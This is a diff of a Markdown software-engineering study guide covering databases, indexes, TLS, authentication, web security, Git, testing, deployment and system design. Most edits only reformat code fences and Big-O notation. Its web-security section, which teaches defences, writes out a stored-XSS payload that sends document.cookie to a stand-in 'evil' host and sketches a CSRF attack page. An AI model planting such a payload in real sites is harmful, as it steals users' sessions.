 **Internal Working, Step by Step - what a database does that your file-writing code does not:**
 
-```
+```text
 YOUR CODE WRITING TO A FILE:
 
   open("orders.csv", "a")
@@ -4703,7 +4701,7 @@ Relationships come in exactly three shapes, and recognizing which one you have i
 
 Joins are where SQL earns its keep, and the important thing is that a join is a *row-pairing operation*, not a set operation on the tables. An **inner join** keeps only pairs that matched. A **left join** keeps every row from the left side and fills the right side with nulls where nothing matched, which is what you want for "every user and their order count, including users with none." A **right join** is the same in reverse and is rarely used because you can always flip the tables. A **full outer join** keeps unmatched rows from both. A **cross join** produces every possible pairing, which is almost always a mistake and occasionally exactly what you want. And a **self join** joins a table to itself, which is how you express "each employee and their manager" when both are rows in the same table.
 
-The internal steps underneath matter because they explain performance. The planner has three join strategies available and picks between them using statistics. A **nested loop join** scans one side and, for each row, looks up matches in the other, which is O(n·m) unless the inner side has an index, in which case it is O(n log m) and is the right choice when one side is tiny. A **hash join** builds a hash table (Phase 6) of the smaller side in memory and then probes it once per row of the larger side, which is O(n + m) and is the workhorse for large equality joins. A **merge join** requires both sides sorted and then walks them in lockstep like the merge step of merge sort (Phase 7), which is excellent when the data is already sorted by the join key, typically because an index provides that order. Reading `EXPLAIN` output and seeing which of these three the planner chose is the difference between guessing at performance and knowing.
+The internal steps underneath matter because they explain performance. The planner has three join strategies available and picks between them using statistics. A **nested loop join** scans one side and, for each row, looks up matches in the other, which is $O(n\cdot m)$ unless the inner side has an index, in which case it is $O(n\log m)$ and is the right choice when one side is tiny. A **hash join** builds a hash table (Phase 6) of the smaller side in memory and then probes it once per row of the larger side, which is $O(n+m)$ and is the workhorse for large equality joins. A **merge join** requires both sides sorted and then walks them in lockstep like the merge step of merge sort (Phase 7), which is excellent when the data is already sorted by the join key, typically because an index provides that order. Reading `EXPLAIN` output and seeing which of these three the planner chose is the difference between guessing at performance and knowing.
 
 One more thing that trips people up constantly, and comes up in interviews as a trick question: `NULL` is not a value but a marker for "unknown," so `NULL = NULL` is not true, it is unknown. That is why you must write `IS NULL` rather than `= NULL`, why `COUNT(column)` skips nulls while `COUNT(*)` does not, why a row with a null never survives a `WHERE column != 'x'` filter, and why `NOT IN` with a subquery that can return nulls silently returns nothing at all. Three-valued logic is the single most common source of quietly wrong SQL.
 
@@ -4737,7 +4735,7 @@ WHERE orders.total > 100;
 
 **Internal Working, Step by Step - the three relationship shapes and what a join actually produces:**
 
-```
+```text
 THE THREE SHAPES, and where the foreign key goes:
 
 ONE-TO-MANY  (one user, many orders)   <-- FK lives on the MANY side
@@ -4989,9 +4987,9 @@ SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;
 | Natural keys (email, ISBN) | Rows are self-describing, and one fewer join to read | The real world changes them, and then every referencing row must change too |
 | Enforced foreign keys | Dangling references become impossible rather than merely unlikely | A write-time check on every insert and delete, and cross-shard references stop working (14.6) |
 | Splitting data across tables | Each fact lives in one place (which is 14.3's whole argument) | Reading a complete picture now costs joins |
-| Nested loop join | Nearly free when one side is tiny, and streams results immediately | O(n·m) without an index on the inner side, which is the classic "why is my query slow" |
-| Hash join | O(n + m) for large equality joins, no sorted input required | The build side must fit in memory or it spills to disk, and it cannot do inequality joins |
-| Merge join | O(n + m) with almost no memory | Requires both inputs sorted, so it costs a sort unless an index already provides the order |
+| Nested loop join | Nearly free when one side is tiny, and streams results immediately | $O(n\cdot m)$ without an index on the inner side, which is the classic "why is my query slow" |
+| Hash join | $O(n+m)$ for large equality joins, no sorted input required | The build side must fit in memory or it spills to disk, and it cannot do inequality joins |
+| Merge join | $O(n+m)$ with almost no memory | Requires both inputs sorted, so it costs a sort unless an index already provides the order |
 | Declarative SQL | The planner can change strategy as your data grows, with no code change | You cannot force a strategy directly, and a stale-statistics plan regression is genuinely hard to debug |
 
 **HOW TO EXPLAIN THIS IN AN INTERVIEW**
@@ -5053,7 +5051,7 @@ One case deserves a specific exception, because it is the single most common leg
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Unnormalized: orders table also stores user_name, user_email directly
         Problem: user's email is duplicated across every order they've ever
         placed. An update must touch every row, or the data becomes
@@ -5078,7 +5076,7 @@ The normalized version is a drivers roster plus a delivery log that references i
 
 **Internal Working, Step by Step - each normal form as the anomaly it removes:**
 
-```
+```text
 STARTING POINT: one table holding everything. Note it is not even in 1NF.
 
  orders
@@ -5238,7 +5236,7 @@ AND THE DELIBERATE REVERSE: denormalization, with the bill attached.
 | 2NF (no partial dependencies) | A repeated attribute has one home, so renaming it is one write | Only relevant with composite keys, and it adds a join |
 | 3NF / BCNF (no transitive dependencies) | Every fact has exactly one authoritative location, so the three anomalies become impossible | More tables, and more joins per read |
 | Fully normalized schema | Writes are cheap and always consistent; the schema documents the domain | Read paths get join-heavy, and a single screen can require six tables |
-| Precomputed counters | A counter read is O(1) instead of an aggregate over a growing table | Every insert and delete must maintain it, and any missed path drifts permanently |
+| Precomputed counters | A counter read is $O(1)$ instead of an aggregate over a growing table | Every insert and delete must maintain it, and any missed path drifts permanently |
 | Duplicated display columns | Removes a join from the hottest read path | Two writes per change, and drift when one is forgotten |
 | Materialized views | The database maintains the denormalized copy, so you cannot forget | Refresh cost and staleness, plus storage for a second copy of the data |
 | Point-in-time captured values | Historical records stay historically accurate | Looks like duplication to a reviewer who has not thought about it, so it needs a comment |
@@ -5383,11 +5381,11 @@ The second way is far more common in real interviews and is a design judgment ca
 | Hard | Construct a table that is in 3NF but not in BCNF, and explain what makes it possible |
 | Hard | Take a fully normalized schema requiring five joins for one page, add a materialized view, and write the refresh strategy including how stale the view is permitted to be |
 
-**WHY THE NEXT TOPIC IS NEEDED - Indexes:** A normalized schema is now correct and non-redundant. But `SELECT * FROM orders WHERE user_id = 5` still has to check every single row in the `orders` table to find matches - the exact O(n) scan problem Phase 2 introduced Big O to describe, and the exact problem hashing (Phase 6) and BSTs (Phase 5) already solved for in-memory data. Databases need the same fix, applied to data on disk.
+**WHY THE NEXT TOPIC IS NEEDED - Indexes:** A normalized schema is now correct and non-redundant. But `SELECT * FROM orders WHERE user_id = 5` still has to check every single row in the `orders` table to find matches - the exact $O(n)$ scan problem Phase 2 introduced Big O to describe, and the exact problem hashing (Phase 6) and BSTs (Phase 5) already solved for in-memory data. Databases need the same fix, applied to data on disk.
 
 ## 14.4 Indexes & B-Trees
 
-**WHY YOU ARE LEARNING THIS:** Without an index, `WHERE user_id = 5` forces a full table scan - O(n), checking every row - exactly the unsorted-array search problem from Phase 2 and Phase 7. An index is a separate, auxiliary data structure that lets the database jump straight to matching rows instead of scanning everything, the same underlying idea as a BST (Phase 5) or a hash table (Phase 6), adapted for disk.
+**WHY YOU ARE LEARNING THIS:** Without an index, `WHERE user_id = 5` forces a full table scan - $O(n)$, checking every row - exactly the unsorted-array search problem from Phase 2 and Phase 7. An index is a separate, auxiliary data structure that lets the database jump straight to matching rows instead of scanning everything, the same underlying idea as a BST (Phase 5) or a hash table (Phase 6), adapted for disk.
 
 **SEE IT BEFORE YOU MEMORIZE IT**
 
@@ -5405,9 +5403,9 @@ An index is a trade you make deliberately: you spend disk space and write throug
 
 The structure almost every relational database actually uses is a **B+ tree**, which differs from a plain B-tree in one important way: all the actual data pointers live in the leaf nodes, and the leaves are linked together in a sorted chain. Internal nodes hold only keys, which act as signposts. Two consequences follow. First, internal nodes fit far more keys per page because they store no data, so the tree is even shallower. Second, a range query becomes "descend once to find the start, then walk the leaf chain," which is why `WHERE created_at BETWEEN x AND y` is fast on a B+ tree and would not be on a hash index. That single property is the reason B+ trees, and not hash tables, are the default.
 
-The **fanout** argument is worth making numerically because it is the whole justification. With an 8 KB page and, say, 16-byte keys plus pointers, one node holds roughly 400 entries. A tree of height 3 therefore addresses 400³, about 64 million rows, and height 4 addresses 25 billion. So finding any row among 64 million costs three page reads, and because the root and usually the entire second level are permanently resident in the buffer pool, the real cost is often one or two actual disk reads. A binary search tree over the same 64 million rows would be 26 levels deep, and each level is a potential separate random read. That gap, roughly 26 reads against 1, is the entire reason databases do not use the tree from Phase 5.2.
+The **fanout** argument is worth making numerically because it is the whole justification. With an 8 KB page and, say, 16-byte keys plus pointers, one node holds roughly 400 entries. A tree of height 3 therefore addresses $400^3$, about 64 million rows, and height 4 addresses 25 billion. So finding any row among 64 million costs three page reads, and because the root and usually the entire second level are permanently resident in the buffer pool, the real cost is often one or two actual disk reads. A binary search tree over the same 64 million rows would be 26 levels deep, and each level is a potential separate random read. That gap, roughly 26 reads against 1, is the entire reason databases do not use the tree from Phase 5.2.
 
-Index *types* matter because they have genuinely different capabilities. A **B-tree index** supports equality, ranges, sorting, and prefix matching, which is why it is the default. A **hash index** supports equality only, in O(1), and cannot help with ranges or `ORDER BY` at all. A **bitmap index** stores one bit per row per distinct value and is excellent for low-cardinality columns combined with `AND` and `OR`, which is why analytics databases favor them. A **GiST** or **R-tree** index handles multi-dimensional and geometric data, so "all restaurants within 2 km" becomes tractable. An **inverted index** maps each term to the list of documents containing it, which is how full-text search and search engines work, and it is the same structure the trie in Phase 9.4 was reaching toward. **GIN** indexes in Postgres are inverted indexes generalized to arrays and JSON.
+Index *types* matter because they have genuinely different capabilities. A **B-tree index** supports equality, ranges, sorting, and prefix matching, which is why it is the default. A **hash index** supports equality only, in $O(1)$, and cannot help with ranges or `ORDER BY` at all. A **bitmap index** stores one bit per row per distinct value and is excellent for low-cardinality columns combined with `AND` and `OR`, which is why analytics databases favor them. A **GiST** or **R-tree** index handles multi-dimensional and geometric data, so "all restaurants within 2 km" becomes tractable. An **inverted index** maps each term to the list of documents containing it, which is how full-text search and search engines work, and it is the same structure the trie in Phase 9.4 was reaching toward. **GIN** indexes in Postgres are inverted indexes generalized to arrays and JSON.
 
 The distinction that causes the most real-world confusion is **clustered versus non-clustered**. A clustered index determines the physical order of the rows on disk, so there can be at most one per table, and looking up by it retrieves the row itself with no second step. InnoDB, the MySQL storage engine, always clusters on the primary key, which is why a random UUID primary key can be genuinely slow to insert into: each insert lands at a random point in the physical ordering and causes page splits, whereas a monotonically increasing key always appends. A non-clustered index stores the key plus a pointer to the row, so using it costs a second lookup to fetch the row, which is why Postgres sometimes decides a sequential scan is cheaper than an index scan that would trigger millions of random row fetches. A **covering index** eliminates that second lookup by including every column the query needs, so the query is answered from the index alone, and this is the single highest-use indexing technique most people have not tried.
 
@@ -5419,7 +5417,7 @@ Finally, the reasons an index is *not* used are worth memorizing because they ar
 
 **BEFORE VS. AFTER**
 
-```
+```text
 No index on orders.user_id
 Search:  O(n)  -- full table scan, every row checked
 
@@ -5439,12 +5437,12 @@ Search:  O(log n) -- and because each B-Tree node holds many keys, the
 
 | Operation | No Index | With B-Tree Index |
 | --- | --- | --- |
-| Point lookup (`WHERE id = 5`) | O(n) | O(log n) |
-| Range query (`WHERE id BETWEEN 5 AND 50`) | O(n) | O(log n + k), k = matching rows |
-| Write (INSERT/UPDATE/DELETE) | O(1) amortized | O(log n) - every index must also be updated |
-| Sorted output (`ORDER BY col`) | O(n log n) explicit sort | O(k) - the leaf chain is already in order |
-| `MIN` / `MAX` on the column | O(n) | O(log n) - walk to the leftmost or rightmost leaf |
-| `COUNT(*)` with a filter on the column | O(n) | O(log n + k), and O(log n) alone if the index covers the query |
+| Point lookup (`WHERE id = 5`) | $O(n)$ | $O(\log n)$ |
+| Range query (`WHERE id BETWEEN 5 AND 50`) | $O(n)$ | $O(\log n+k)$, where $k$ is the number of matching rows |
+| Write (INSERT/UPDATE/DELETE) | $O(1)$ amortized | $O(\log n)$ - every index must also be updated |
+| Sorted output (`ORDER BY col`) | $O(n\log n)$ explicit sort | $O(k)$ - the leaf chain is already in order |
+| `MIN` / `MAX` on the column | $O(n)$ | $O(\log n)$ - walk to the leftmost or rightmost leaf |
+| `COUNT(*)` with a filter on the column | $O(n)$ | $O(\log n+k)$, and $O(\log n)$ alone if the index covers the query |
 | Storage | Table only | Table plus one full copy of the indexed column(s), typically 10 to 30 percent per index |
 
 **PICTURE IT LIKE THIS**
@@ -5455,7 +5453,7 @@ The B-tree part of the analogy is the difference between a textbook index and a 
 
 **Internal Working, Step by Step - the structure, the descent, and the split:**
 
-```
+```text
 A B+ TREE INDEX on orders(id), holding 12 rows. Note where the DATA is.
 
                         +---------------+
@@ -5820,7 +5818,7 @@ A bank wire transfer form that either fully processes - debit and credit both po
 
 Drawn out, with each anomaly produced deliberately on a timeline:
 
-```
+```text
 ATOMICITY, and the mechanism that delivers it (from 14.1's write-ahead log):
 
   BEGIN
@@ -6211,7 +6209,7 @@ Finally, the most important thing about this section: almost nobody needs it as 
 
 **Before vs. After, layered - this is the same "complexity evolves because a new requirement was accepted" pattern from Phase 2, now at the systems level:**
 
-```
+```text
 Single database server
         Problem 1 (availability): if this one machine dies, the application
         has zero database access until it's repaired.
@@ -6246,7 +6244,7 @@ independent database servers (e.g. users A-M on server 1, N-Z on server 2)
 
 **Internal Working, Step by Step - the topologies, the lag, and the ring:**
 
-```
+```text
 SINGLE-LEADER REPLICATION, which is what you should reach for first:
 
                       writes only
@@ -6787,7 +6785,7 @@ Two operational details cause most real-world TLS problems. **SNI**, or Server N
 
 **System -> Weakness -> Attack -> Consequence -> Defense**
 
-```
+```text
 System:      Plain HTTP (Phase 13.1) sends requests and responses as
              readable plain text over the TCP connection from Phase 12.2.
 Weakness:    Anyone who can observe network traffic between client and
@@ -6807,7 +6805,7 @@ Trade-off:   A TLS handshake adds its own round-trip(s) of latency before
 
 **Internal Working, Step by Step (simplified TLS handshake, happening right after Phase 12.2's TCP handshake completes):**
 
-```
+```text
 Client -> Server: "ClientHello" (supported TLS versions, cipher suites)
 Server -> Client: "ServerHello" + its certificate (proves server identity,
                    signed by a trusted Certificate Authority) + a public key
@@ -6827,7 +6825,7 @@ Forward secrecy is the detail that makes the analogy complete. The two people bu
 
 **Internal Working, TLS 1.2 versus TLS 1.3 round trips**
 
-```
+```text
 TLS 1.2  (2 round trips before the first HTTP byte)
 
   Client                                          Server
@@ -6862,7 +6860,7 @@ TLS 1.3  (1 round trip)
 
 **Internal Working, certificate chain validation**
 
-```
+```text
 What the browser actually checks, in order:
 
    yourbank.com certificate
@@ -7033,7 +7031,7 @@ Finally, **authentication and authorization are different questions** and confla
 
 **System -> Weakness -> Attack -> Consequence -> Defense**
 
-```
+```text
 System:      HTTP is stateless (Phase 13.1) -- every request is handled
              with zero memory of any previous request.
 Weakness:    Without extra state, a server can't tell "the same person
@@ -7054,7 +7052,7 @@ Trade-off:   Server-side sessions mean the server must store and look up
 
 **Internal Working, Step by Step**
 
-```
+```text
 1. User submits login form -> server verifies credentials (15.3)
 2. Server creates a session record: {session_id: "abc123", user_id: 5}
 3. Server responds: Set-Cookie: session_id=abc123
@@ -7073,7 +7071,7 @@ Every cookie attribute has a hotel equivalent. `HttpOnly` is the card being phys
 
 **Internal Working, the four cookie attributes and what each one stops**
 
-```
+```text
 Set-Cookie: sid=8f3a...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
 
   HttpOnly ---------------------------------------------------
@@ -7104,7 +7102,7 @@ Set-Cookie: sid=8f3a...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
 
 **Internal Working, session fixation and why login must regenerate the id**
 
-```
+```text
 BROKEN (session id reused across the login boundary)
 
   Attacker: obtains a valid pre-login session id  "S1"
@@ -7316,7 +7314,7 @@ Finally, the policy advice most people learned is now formally discouraged. NIST
 
 **System -> Weakness -> Attack -> Consequence -> Defense**
 
-```
+```text
 System:      A login form checks a submitted password against a stored one.
 Weakness:    Storing the password in plain text means anyone with database
              access (an attacker who breaches the DB, or a rogue insider)
@@ -7345,7 +7343,7 @@ The salt is the locksmith stamping a different unique serial into each box's mec
 
 **Internal Working, why a fast hash fails and a slow one does not**
 
-```
+```text
 An attacker has stolen the password table. They do not reverse
 hashes; they guess and compare. Everything depends on rate.
 
@@ -7383,7 +7381,7 @@ hashes; they guess and compare. Everything depends on rate.
 
 **Internal Working, what is actually stored and how it is verified**
 
-```
+```text
 REGISTRATION
   1. user submits "correct horse battery staple"
   2. generate 16 random bytes of salt  (secrets, never random)
@@ -7418,13 +7416,13 @@ LOGIN
 | Approach | Attacker guesses/sec (1 GPU) | Precomputation works | Memory-hard | Verdict |
 | --- | --- | --- | --- | --- |
 | Plaintext | n/a, already has them | n/a | no | catastrophic |
-| MD5 / SHA-1, unsalted | ~10^10 and up | yes, instantly | no | equivalent to plaintext for common passwords |
-| SHA-256, unsalted | ~10^10 | yes | no | broken |
-| SHA-256, salted | ~10^10 per user | no | no | still broken, only slower to scale |
-| PBKDF2, 600k iterations | ~10^5 | no | no | acceptable, FIPS-compliant, GPU-friendly |
-| bcrypt, cost 12 | ~2x10^4 | no | partially | good, widely available, 72-byte input limit |
-| scrypt | ~10^3 | no | yes | good |
-| Argon2id, 64 MB | ~10^2 | no | yes | current recommendation |
+| MD5 / SHA-1, unsalted | $\sim10^{10}$ and up | yes, instantly | no | equivalent to plaintext for common passwords |
+| SHA-256, unsalted | $\sim10^{10}$ | yes | no | broken |
+| SHA-256, salted | $\sim10^{10}$ per user | no | no | still broken, only slower to scale |
+| PBKDF2, 600k iterations | $\sim10^5$ | no | no | acceptable, FIPS-compliant, GPU-friendly |
+| bcrypt, cost 12 | $\sim2\times10^4$ | no | partially | good, widely available, 72-byte input limit |
+| scrypt | $\sim10^3$ | no | yes | good |
+| Argon2id, 64 MB | $\sim10^2$ | no | yes | current recommendation |
 
 The cost is real and must be budgeted. At 250 milliseconds per verification, a single core handles four logins per second, so a login endpoint needs either concurrency headroom or an explicit queue, and it becomes a denial-of-service target precisely because it is expensive by design. Argon2's memory parameter compounds this: 64 MB per concurrent verification means 100 simultaneous logins want 6.4 GB. The standard mitigations are rate limiting per account and per IP before the hash is computed, and running verification on a thread pool so it never blocks the event loop. Choosing the parameter is therefore a capacity decision, not only a security one, and the honest rule is to pick the highest cost your login traffic can absorb at peak.
 
@@ -7602,7 +7600,7 @@ The flow you should know is the **authorization code flow with PKCE**, and it is
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Server-side sessions (15.2)
         Problem: every request requires a lookup against a central
         session store -- fine for one service, an awkward bottleneck
@@ -7629,7 +7627,7 @@ A JWT is like a concert wristband stamped by the venue itself: any staff member 
 
 **Internal Working, the anatomy of a token**
 
-```
+```text
 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjYtMDgifQ
 .eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiI1Iiw
  iYXVkIjoiYXBpLmV4YW1wbGUuY29tIiwiZXhwIjoxNzU0MzAwMDAwLCJzY29
@@ -7667,7 +7665,7 @@ eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjYtMDgifQ
 
 **Internal Working, the two-token design and why it exists**
 
-```
+```text
 The problem: a JWT cannot be un-issued. Deleting a session row is
 instant; deleting an assertion someone already holds is impossible.
 
@@ -7705,7 +7703,7 @@ Solution: split the lifetime from the revocability.
 
 **Internal Working, the authorization code flow with PKCE**
 
-```
+```text
   User            Client app          Authorization server      API
    |                  |                       |                  |
    |  "log in"  --->  |                       |                  |
@@ -7960,7 +7958,7 @@ One idea connects all four topics. Each bug occurs at a **boundary where ordinar
 
 **SQL Injection - trusting user input inside a database query (attacks Phase 14.2)**
 
-```
+```text
 System:      A query is built by directly concatenating user input:
              "SELECT * FROM users WHERE name = '" + user_input + "'"
 Weakness:    The user input becomes part of the SQL syntax itself, not
@@ -7979,7 +7977,7 @@ Trade-off:   None real -- this is close to a strictly-better fix with no
 
 **XSS (Cross-Site Scripting) - trusting user input inside rendered HTML**
 
-```
+```text
 System:      A comment section renders user-submitted text directly
              into the page's HTML.
 Weakness:    If the input isn't escaped, submitted text like
@@ -7995,7 +7993,7 @@ Defense:     ESCAPE/SANITIZE all user-generated content before rendering
 
 **CSRF (Cross-Site Request Forgery) - trusting that a request came from where it claims**
 
-```
+```text
 System:      A logged-in user's browser automatically attaches their
              session cookie (15.2) to every request to your site.
 Weakness:    A malicious page on a COMPLETELY DIFFERENT site can trigger
@@ -8013,7 +8011,7 @@ Defense:     A CSRF token -- a random, unpredictable value embedded in
 
 **CORS (Cross-Origin Resource Sharing) - the browser's own safety check, and where it's often misconfigured**
 
-```
+```text
 System:      Browsers enforce the "same-origin policy" by default: a
              script from one origin (site A) cannot read a response from
              a different origin (site B) unless site B explicitly allows it.
@@ -8037,7 +8035,7 @@ XSS is the same slip pinned to a public noticeboard where other guests read it a
 
 **Internal Working, SQL injection and why parameterization is structural**
 
-```
+```text
 CONCATENATION -- the database receives one indivisible string
 
   app builds:  "SELECT * FROM users WHERE name = '" + inp + "'"
@@ -8078,7 +8076,7 @@ PREPARED STATEMENT -- two separate messages, and order is everything
 
 **Internal Working, the three flavours of XSS and where each defence applies**
 
-```
+```text
 STORED            attacker -> your DB -> every future viewer
    POST /comments  body: <img src=x onerror=fetch('//evil/'+document.cookie)>
    server stores it verbatim, renders it verbatim
@@ -8126,7 +8124,7 @@ DEFENCE IN DEPTH -- CSP, for when escaping failed anyway
 
 **Internal Working, CSRF and why CORS does not stop it**
 
-```
+```text
   victim's browser is logged into bank.com (cookie: sid=abc)
 
   victim visits evil.com, which serves:
@@ -8172,7 +8170,7 @@ DEFENCE IN DEPTH -- CSP, for when escaping failed anyway
 
 **Internal Working, the CORS preflight**
 
-```
+```text
 SIMPLE REQUEST (GET/HEAD/POST, only safelisted headers)
   sent immediately; the browser withholds the RESPONSE from the
   script unless the headers permit it.
@@ -8461,7 +8459,7 @@ Three recovery facts are worth more than any workflow advice, because they remov
 
 **BEFORE VS. AFTER**
 
-```
+```text
 No version control -- shared files, manual "final_v2_REAL_final.py" copies
         Problem: no safe way to combine two people's simultaneous changes,
         no way to see what changed between versions, no way to revert
@@ -8487,7 +8485,7 @@ Merging is binding a new edition that credits two previous editions as its paren
 
 **Internal Working, what a commit actually is**
 
-```
+```text
 $ echo "hello" > greeting.txt && git add . && git commit -m "first"
 
 Four object types, all stored by the hash of their own contents:
@@ -8526,7 +8524,7 @@ Consequences of hashing contents rather than tracking diffs:
 
 **Internal Working, the three areas and what each command moves**
 
-```
+```text
   working directory        staging area (index)        repository
    (files on disk)         (next commit's contents)    (history)
         |                          |                        |
@@ -8553,7 +8551,7 @@ Consequences of hashing contents rather than tracking diffs:
 
 **Internal Working, merge versus rebase on the same graph**
 
-```
+```text
 STARTING POINT
   main      A---B---C
                   \
@@ -8597,7 +8595,7 @@ CONFLICT, and what the markers mean
 
 **Internal Working, git bisect as binary search over history**
 
-```
+```text
 "The test passed 500 commits ago and fails now. Which commit broke it?"
 
 Linear search: check up to 500 commits.
@@ -8628,13 +8626,13 @@ commit -- and a 40-file commit tells you much less than a 3-line one.
 
 | Operation | Cost | Why |
 | --- | --- | --- |
-| Create a branch | O(1), writes 41 bytes | a branch is a pointer, not a copy |
-| Switch branches | O(changed files) | only files that differ are rewritten |
-| Commit | O(changed files) | unchanged blobs are already stored and reused |
-| `git log` | O(commits walked) | walks the parent chain |
-| `git bisect` | O(log n) tests | binary search over history |
-| Clone | O(entire history) | which is why shallow clones exist for CI |
-| Merge | O(changes since the common ancestor) | three-way diff against the merge base |
+| Create a branch | $O(1)$, writes 41 bytes | a branch is a pointer, not a copy |
+| Switch branches | $O(\text{changed files})$ | only files that differ are rewritten |
+| Commit | $O(\text{changed files})$ | unchanged blobs are already stored and reused |
+| `git log` | $O(\text{commits walked})$ | walks the parent chain |
+| `git bisect` | $O(\log n)$ tests | binary search over history |
+| Clone | $O(\text{entire history})$ | which is why shallow clones exist for CI |
+| Merge | $O(\text{changes since the common ancestor})$ | three-way diff against the merge base |
 | Storage of a 1-byte change | one new blob for the whole file, later delta-compressed | content addressing first, packfiles second |
 
 | Choice | Gain | Cost |
@@ -8761,7 +8759,7 @@ Interviewers rarely quiz Git commands directly, but "walk me through how you'd h
 | Easy | Complete the Main and Remote introduction sequences on [Learn Git Branching](https://learngitbranching.js.org/) |
 | Easy | Run `git cat-file -p HEAD` and walk by hand from the commit to a tree to a blob. Report each hash |
 | Easy | Create the same file content under two different names, commit, and prove from the tree that only one blob exists |
-| Easy | Print the contents of `.git/refs/heads/main` and explain in one sentence why branching is O(1) |
+| Easy | Print the contents of `.git/refs/heads/main` and explain in one sentence why branching is $O(1)$ |
 | Easy | Write three commit messages for real changes you have made, following [Conventional Commits](https://www.conventionalcommits.org/) |
 | Medium | Create a deliberate merge conflict between two branches, resolve it by hand, and explain what each conflict marker meant |
 | Medium | Take a branch with five messy commits and use interactive rebase to reduce it to three coherent ones with rewritten messages |
@@ -8811,7 +8809,7 @@ Finally, **test-driven development** is a design technique that happens to produ
 
 **Mental Model - why a *pyramid*, not one type of test:**
 
-```
+```text
         /\
        /  \      End-to-End (E2E) tests -- FEW of these
       /----\     Test the whole system together, like a real user would
@@ -8824,7 +8822,7 @@ Finally, **test-driven development** is a design technique that happens to produ
 ```
 **BEFORE VS. AFTER**
 
-```
+```text
 All manual testing, or all E2E tests
         Problem: E2E tests are slow (spinning up a whole system) and
         brittle (a tiny UI change can break a test that has nothing to
@@ -8851,7 +8849,7 @@ Mocking has an analogy too, and it explains the risk exactly. Testing the wing a
 
 **Internal Working, the cost and precision gradient**
 
-```
+```text
                           count   speed        what a failure tells you
   /\
  /E2E\      end to end       ~10   30s-5min    "something in the system
@@ -8886,7 +8884,7 @@ Mocking has an analogy too, and it explains the risk exactly. Testing the wing a
 
 **Internal Working, what a test double is and when each is safe**
 
-```
+```text
 Real:   the actual thing.                Best when affordable.
             db = PostgresRepo(real_connection)
 
@@ -8925,7 +8923,7 @@ DEFENSIBLE RULE
 
 **Internal Working, coverage versus mutation testing**
 
-```
+```text
 def apply_discount(price, percent):
     if percent > 50:
         percent = 50            # cap
@@ -9242,7 +9240,7 @@ The empirical backing for all of this is the DORA research, which found four met
 
 **BEFORE VS. AFTER**
 
-```
+```text
 Manual testing and manual deployment
         Problem: inconsistent, skippable under pressure, and a deploy
         that "should be fine" can silently break production with no
@@ -9270,7 +9268,7 @@ Canary deployment is releasing the new model to a hundred customers in one city 
 
 **Internal Working, the pipeline as stages ordered by cost**
 
-```
+```text
   git push
      |
      v
@@ -9316,7 +9314,7 @@ Canary deployment is releasing the new model to a hundred customers in one city 
 
 **Internal Working, three deployment strategies compared**
 
-```
+```text
 ROLLING  -- replace instances in batches
    v1 v1 v1 v1        ->    v2 v1 v1 v1    ->   v2 v2 v1 v1  -> ...
    + no extra infrastructure
@@ -9352,7 +9350,7 @@ CANARY  -- a small slice of REAL traffic, judged on metrics
 
 **Internal Working, the expand-contract migration that makes any of this safe**
 
-```
+```text
 GOAL: rename users.name to users.full_name with zero downtime,
       while v1 and v2 are both live.
 
@@ -9395,7 +9393,7 @@ EXPAND / MIGRATE / CONTRACT -- four deploys, each safe alone:
 
 **Internal Working, deploy versus release, and what a feature flag buys**
 
-```
+```text
 WITHOUT FLAGS -- deployment and release are the same event
    feature branch lives 3 weeks
        -> diverges from main
@@ -9717,7 +9715,7 @@ Before choosing anything you need numbers, and **back-of-the-envelope estimation
 
 Finally, the honest warning about **microservices**, which is the stage most often adopted for the wrong reason. Splitting a system into services solves an *organisational* scaling problem, letting teams deploy independently, and it does not by itself make anything faster. What it does is convert reliable in-process function calls into unreliable network calls, replace a single database transaction with a distributed one that no longer has atomicity, and turn a stack trace into a distributed tracing problem. Those costs are worth paying when the team coordination bottleneck is real, and they are pure loss when it is not, which is why a well-structured modular monolith is the correct answer far more often than the industry's enthusiasm suggests.
 
-```
+```text
 STAGE 1 -- Single Server
 One machine runs the application code AND the database (Phase 14).
         Fine for: low traffic, early-stage products.
@@ -9815,7 +9813,7 @@ Replication is keeping a second complete kitchen that can take over if the first
 
 **Internal Working, where the traffic actually goes at each stage**
 
-```
+```text
 STAGE 1                        STAGE 2-3
   user                           user
    |                              |
@@ -9861,7 +9859,7 @@ STAGE 4-6
 
 **Internal Working, back-of-the-envelope estimation, worked**
 
-```
+```text
 "Design a URL shortener for 100 million new links per month."
 
 WRITES
@@ -9908,7 +9906,7 @@ the most common interview error is designing for stage 7 unasked.
 
 **Internal Working, the three cache failure modes with names**
 
-```
+```text
 1. STAMPEDE (thundering herd) -- a hot key expires
       t=0    key "product:1" expires
       t=0    1,000 concurrent requests all MISS
@@ -10241,7 +10239,7 @@ Two bank branches, connected by a line that's just gone down, both need to answe
 
 **Internal Working, the proof in six steps**
 
-```
+```text
 Two nodes, one value, replicated. A cable is cut.
 
     client A                                    client B
@@ -10285,7 +10283,7 @@ Two nodes, one value, replicated. A cable is cut.
 
 **Internal Working, quorums make consistency a dial**
 
-```
+```text
 N = 3 replicas.  W = replicas that must ack a write.
                  R = replicas that must answer a read.
 
@@ -10325,7 +10323,7 @@ AND THE SAME SYSTEM CAN DO BOTH, per query:
 
 **Internal Working, PACELC, the part that governs every normal day**
 
-```
+```text
                    is there a Partition?
                     /                  \
                  YES                    NO  (99.9%+ of the time)
@@ -10617,7 +10615,7 @@ Then the design is stressed against failures deliberately: what happens in a fir
 
 **Internal Working, the forty-five minute structure**
 
-```
+```text
   0-5    CLARIFY            functional requirements, explicit scope,
    |                        then the numbers that decide the design:
    |                        users, read:write, latency, availability,
@@ -10663,7 +10661,7 @@ Then the design is stressed against failures deliberately: what happens in a fir
 
 **Internal Working, the worked example the exercise below asks for**
 
-```
+```text
 PROMPT: "Design a URL shortener."
 
 1. CLARIFY
@@ -11097,7 +11095,7 @@ The final practical point is that **consistency is chosen per operation, not per
 
 **BEFORE VS. AFTER**
 
-```
+```text
 "Eventual consistency" (the loose guarantee many earlier mentions implied)
         Problem: "eventually" is not a number -- an application can't
         reason about correctness if the staleness window is unbounded
